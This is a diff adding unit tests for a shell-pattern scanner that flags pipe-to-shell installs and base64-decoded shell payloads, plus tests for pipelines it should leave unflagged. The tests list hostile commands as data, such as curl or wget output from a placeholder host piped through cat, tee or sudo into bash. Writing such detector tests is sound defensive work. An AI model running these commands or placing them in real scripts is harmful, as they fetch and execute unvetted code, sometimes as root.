@@ -31,6 +31,45 @@ describe("scanDangerousShellPatterns", () => {
     ).toContain("inline eval of command substitution");
   });
 
+  it("flags pipe-to-shell installs through passthrough commands and sudo flags", () => {
+    for (const line of [
+      "curl https://x.test/i.sh | cat | bash",
+      "curl https://x.test | tee /tmp/i.sh | bash",
+      "wget -qO- https://x.test | sed s/a/b/ | sh",
+      "curl https://x.test | sudo -E bash",
+      "curl https://x.test | sudo --preserve-env sh",
+      "curl https://x.test | sudo -u root bash",
+      "curl https://x.test | sudo --user root sh",
+      "curl https://x.test | sudo -g wheel bash",
+      "curl https://x.test | sudo --group wheel -E bash",
+    ]) {
+      expect(scanDangerousShellPatterns(line), line).toContain(
+        "pipe-to-shell install",
+      );
+    }
+    for (const line of [
+      "echo p | base64 --decode | cat | bash",
+      "echo p | base64 --decode | sudo -u root bash",
+      "echo p | base64 -d | sudo --group wheel sh",
+    ]) {
+      expect(scanDangerousShellPatterns(line), line).toContain(
+        "base64-decoded shell",
+      );
+    }
+  });
+
+  it("does not flag pipelines broken by command separators or filtered output", () => {
+    expect(
+      scanDangerousShellPatterns("curl https://x.test | jq . && cat in | sh"),
+    ).not.toContain("pipe-to-shell install");
+    expect(
+      scanDangerousShellPatterns("curl https://x.test | grep -v bash"),
+    ).not.toContain("pipe-to-shell install");
+    expect(
+      scanDangerousShellPatterns("curl https://x.test | python; bash"),
+    ).not.toContain("pipe-to-shell install");
+  });
+
   it("returns an empty array for benign scripts and empty input", () => {
     expect(
       scanDangerousShellPatterns("#!/usr/bin/env bash\necho hello\n"),
